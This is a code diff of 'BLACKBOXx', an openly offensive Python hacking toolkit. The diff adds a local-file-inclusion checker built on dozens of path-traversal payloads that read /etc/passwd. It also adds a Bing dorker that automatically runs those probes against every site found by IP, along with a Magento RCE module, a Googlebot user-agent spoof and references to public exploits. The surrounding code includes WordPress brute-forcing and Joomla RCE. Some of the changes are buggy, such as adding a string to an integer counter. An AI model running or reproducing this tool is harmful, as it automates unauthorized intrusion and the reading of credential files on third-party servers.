@@ -12,15 +12,17 @@
 ###     You should have received a copy of the GNU General Public License     ###
 ###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
 #################################################################################
+### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
+### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/
 import requests,json,sys, time, re, os, base64, random
 from time import gmtime, strftime
 from optparse import OptionParser
 from urlparse import parse_qs, urlparse
 
-__author__     = 'Black Eye'
+__author__     = 'BLACK EYE'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
-__emailadd__   = 'blackdoor197@yahoo.co.uk'
-__twitter__    = 'https://twitter.com/darkeyepy'
+__emailadd__   = 'blackdoor197@riseup.net'
+__twitter__    = 'https://twitter.com/0x676'
 __version__    = '0.7'
 __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOXx v%s' % (__version__)
@@ -37,9 +39,13 @@ def __help__():
 	print color.BOLD+color.W+"Help    : "+color.ENDC+sys.argv[0]+" -h/--help"
 	print color.W+color.BOLD+"Modules : "+color.ENDC
 	print "\t\t+ Wordpress Bruteforce          :   wordpress_brute"
+	#print "\t\t+ SSH Bruteforce                :   ssh_brute"
+	#print "\t\t+ FTP Bruteforce                :   ftp_brute"
 	print "\t\t+ Dnsinfo                       :   dns_info"
 	print "\t\t+ Joomla Rce                    :   rce_joomla"
+	print "\t\t+ Magento Rce                   :   rce_magento"
 	print "\t\t+ Google Dorker                 :   google_dorker"
+	print "\t\t+ Bing Dorker                   :   bing_dorker"
 	print "\t\t+ update Database (sudo needed) :   -u/--update"
 
 def __update__():
@@ -57,82 +63,166 @@ class color:
 	M    =  '\033[95m' # Magenta
 	C    =  '\033[96m' # Cyan
 	ENDC =  '\033[0m'  # end colors
+
+
+class checker:
+	def lfi(self, url):
+		LFI = []
+		def lfi_link(url):
+			payloads=[
+			"../etc/passwd",
+			"../etc/passwd%00",
+			"../../etc/passwd",
+			"../../etc/passwd%00",
+			"../../../etc/passwd",
+			"../../../etc/passwd%00",
+			"../../../../etc/passwd",
+			"../../../../etc/passwd%00",
+			"../../../../../etc/passwd",
+			"../../../../../etc/passwd%00",
+			"../../../../../../etc/passwd",
+			"../../../../../../etc/passwd%00",
+			"../../../../../../../etc/passwd",
+			"../../../../../../../etc/passwd%00",
+			"../../../../../../../../etc/passwd",
+			"../../../../../../../../etc/passwd%00",
+			"../../../../../../../../../etc/passwd",
+			"../../../../../../../../../etc/passwd%00",
+			"../../../../../../../../../../etc/passwd",
+			"../../../../../../../../../../etc/passwd%00",
+			"../../../../../../../../../../../etc/passwd",
+			"../../../../../../../../../../../etc/passwd%00",
+			"../../../../../../../../../../../../etc/passwd",
+			"../../../../../../../../../../../../etc/passwd%00",
+			"..%2Fetc%2Fpasswd",
+			"..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
+			lfi = re.findall(r'=(.*)', url)
+			for i in lfi:
+				l=re.sub(i, '', url)
+				for payload in payloads:
+					payload=payload.strip()
+					lfi = l+payload
+					LFI.append(lfi)
+		lfi_link(url)
+		for i in LFI:
+			r = requests.get(i)
+			if "root" in r.content:
+				print color.W+color.BOLD+"LFI FOUND :"+color.Y+i
+			else:
+				continue
+	def sqli(self, url):
+		pass
 ####################################
 ##                                ##
-##        GOOGLE DORKER           ##
+##            DORKER              ##
 ##                                ##
 ####################################
-class google:
-	url = []
-	def random(self):
-		tld = [
-		'ae', 'am', 'as', 'at',
-		'az', 'ba', 'be', 'bg',
-		'bi', 'bs', 'ca', 'cd',
-		'cg', 'ch', 'ci', 'cl',
-		'co.bw', 'co.ck', 'co.cr', 'co.hu',
-		'co.id', 'co.il', 'co.im', 'co.in',
-		'co.je', 'co.jp', 'co.ke', 'co.kr',
-		'co.ls', 'co.ma', 'co.nz', 'co.th',
-		'co.ug', 'co.uk', 'co.uz', 'co.ve',
-		'co.vi', 'co.za', 'co.zm', 'com',
-		'com.af', 'com.ag', 'com.ar', 'com.au',
-		'com.bd', 'com.bo', 'com.br', 'com.bz',
-		'com.co', 'com.cu', 'com.do', 'com.ec',
-		'com.eg', 'com.et', 'com.fj', 'com.gi',
-		'com.gt', 'com.hk', 'com.jm', 'com.kw',
-		'com.ly', 'com.mt', 'com.mx', 'com.my',
-		'com.na', 'com.nf', 'com.ni', 'com.np',
-		'com.om', 'com.pa', 'com.pe', 'com.ph',
-		'com.pk', 'com.pr', 'com.py', 'com.qa',
-		'com.sa', 'com.sb', 'com.sg', 'com.sv',
-		'com.tj', 'com.tr', 'com.tw', 'com.ua',
-		'com.uy', 'com.uz', 'com.vc', 'com.vn',
-		'cz', 'de', 'dj', 'dk',
-		'dm', 'ee', 'es', 'fi',
-		'fm', 'fr', 'gg', 'gl',
-		'gm', 'gr', 'hn', 'hr',
-		'ht', 'hu', 'ie', 'is',
-		'it', 'jo', 'kg', 'kz',
-		'li', 'lk', 'lt', 'lu',
-		'lv', 'md', 'mn', 'ms',
-		'mu', 'mw', 'net','nl',
-		'no', 'nr', 'nu', 'pl',
-		'pn', 'pt', 'ro', 'ru',
-		'rw', 'sc', 'se', 'sh',
-		'si', 'sk', 'sm', 'sn',
-		'tm', 'to', 'tp', 'tt',
-		'uz', 'vg', 'vu', 'ws']
-		tld_rand = random.sample(tld, 1)
-		for tldd in tld_rand:
-			return tldd
-	def __init__(self, dork, start, stop):
-		tld = self.random()
+class dorker:
+	def google(self, dork, start, stop):
+		urll = []
+		def randomm():
+			tld = [
+			'ae', 'am', 'as', 'at',
+			'az', 'ba', 'be', 'bg',
+			'bi', 'bs', 'ca', 'cd',
+			'cg', 'ch', 'ci', 'cl',
+			'co.bw', 'co.ck', 'co.cr', 'co.hu',
+			'co.id', 'co.il', 'co.im', 'co.in',
+			'co.je', 'co.jp', 'co.ke', 'co.kr',
+			'co.ls', 'co.ma', 'co.nz', 'co.th',
+			'co.ug', 'co.uk', 'co.uz', 'co.ve',
+			'co.vi', 'co.za', 'co.zm', 'com',
+			'com.af', 'com.ag', 'com.ar', 'com.au',
+			'com.bd', 'com.bo', 'com.br', 'com.bz',
+			'com.co', 'com.cu', 'com.do', 'com.ec',
+			'com.eg', 'com.et', 'com.fj', 'com.gi',
+			'com.gt', 'com.hk', 'com.jm', 'com.kw',
+			'com.ly', 'com.mt', 'com.mx', 'com.my',
+			'com.na', 'com.nf', 'com.ni', 'com.np',
+			'com.om', 'com.pa', 'com.pe', 'com.ph',
+			'com.pk', 'com.pr', 'com.py', 'com.qa',
+			'com.sa', 'com.sb', 'com.sg', 'com.sv',
+			'com.tj', 'com.tr', 'com.tw', 'com.ua',
+			'com.uy', 'com.uz', 'com.vc', 'com.vn',
+			'cz', 'de', 'dj', 'dk',
+			'dm', 'ee', 'es', 'fi',
+			'fm', 'fr', 'gg', 'gl',
+			'gm', 'gr', 'hn', 'hr',
+			'ht', 'hu', 'ie', 'is',
+			'it', 'jo', 'kg', 'kz',
+			'li', 'lk', 'lt', 'lu',
+			'lv', 'md', 'mn', 'ms',
+			'mu', 'mw', 'net','nl',
+			'no', 'nr', 'nu', 'pl',
+			'pn', 'pt', 'ro', 'ru',
+			'rw', 'sc', 'se', 'sh',
+			'si', 'sk', 'sm', 'sn',
+			'tm', 'to', 'tp', 'tt',
+			'uz', 'vg', 'vu', 'ws']
+			tld_rand = random.sample(tld, 1)
+			for tldd in tld_rand:
+				return tldd
+		tld = randomm()
 		def google_search():
 			google = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
 			return google
 		def get_url(url):
-			html = requests.get(url).content
+			headers = {'User-Agent'  : 'Googlebot/2.1b'}
+			html = requests.get(url, headers=headers).content
 			k = re.findall(r'<h3 class="r"><a href="(.*?)"', html)
 			for s in k:
 				s=s.strip()
 				if s.startswith('/url?'):
 					o = urlparse(s, 'http')
 					link = parse_qs(o.query)['q'][0]
-					self.url.append(link)
+					urll.append(link)
 					ope = open("url.txt", "a")
 					ope.write(link+"\n")
 					ope.close
 		def search_url(start, stop):
 			while start<stop:
 				google_start = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
-				start+=10
+				start+="10"
 				get_url(google_start)
-			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.url))+" FOUND"
+			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(urll))+" FOUND"
 		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tld
 		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+google_search()
-		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC
 		search_url(start, stop)
+	def bing(self, ip,dork):
+		bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'=&count=50000'
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+bing
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
+		get = requests.get(bing)
+		html = get.content
+		link = re.findall(r'<h2><a href="(.*?)"', html)
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(link))+" FOUND"+color.ENDC
+		for i in link:
+			print i
+			checker().lfi(i)
+
 
 ####################################
 ##                                ##
@@ -187,6 +277,7 @@ class BruteForce:
 ##    Add RCE joomla & Magento    ##
 ##                                ##
 ####################################
+
 class rce:
 	def joomla(self, wordlist):
 		wordlist = open(wordlist, "r")
@@ -252,11 +343,13 @@ class rce:
 				print "{0}/admin with login : admin:admin".format(target_url)
 			else:
 				print "NOT WORKED with {0}".format(target_url)
+
 ####################################
 ##                                ##
 ##      Get Website from IP       ##
 ##                                ##
 ####################################
+
 class dnsinfo:
 	def yougetsignal(self, ip):
 		def Details():
@@ -267,10 +360,8 @@ class dnsinfo:
 			headers={
 			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
 			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-
 			get = requests.post(yougetsignal, data=data, headers=headers)
 			get = get.text
-
 			ok = json.loads(get)
 			return ok
 		
@@ -286,6 +377,9 @@ class dnsinfo:
 			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
 		details = Details()
 		rzlt(details)
+	def viewdns(self):
+		pass
+
 
 def __main__():
 	__banner__()
@@ -348,28 +442,29 @@ def __main__():
 			parser = OptionParser()
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
-			parser.add_option("--start", metavar="NUMBER", type=int, default=0,
+			parser.add_option("--start",default=0,
 				help="Number of page for start")
-			parser.add_option("--stop", metavar="NUMBER", type=int, default=0,
+			parser.add_option("--stop",
 				help="Number of page to stop")
-			#parser.add_option("--ssl",
-			#	help="Get HTTPS(SSL) Website",action="store_true")
-			#parser.add_option("--no-ssl",
-			#	help="Get HTTP Website",action="store_true")
 			(options,args) = parser.parse_args()
 			dork = options.dork
 			start = options.start
 			stop = options.stop
-			#ssl  = options.ssl
-			#no_ssl = options.no_ssl
-			#if dork and stop and start:
-			google(dork, start, stop)
+			if dork and start and stop:
+				dorker().google(dork, start, stop)
+		if (arg=="bing_dorker"):
+			parser = OptionParser()
+			parser.add_option("--ip")
+			parser.add_option("--dork","-d",
+				help="Dork for get URL")
+			(options,args) = parser.parse_args()
+			ip = options.ip
+			dork = options.dork
+			if ip and dork:
+				dorker().bing(ip,dork)
 
 		if (arg=="-u" or arg=="--update"):
 			__update__()
-		if (arg==None):
-			print "--help"
-
 if __name__ == '__main__':
 	try:
 		__main__()
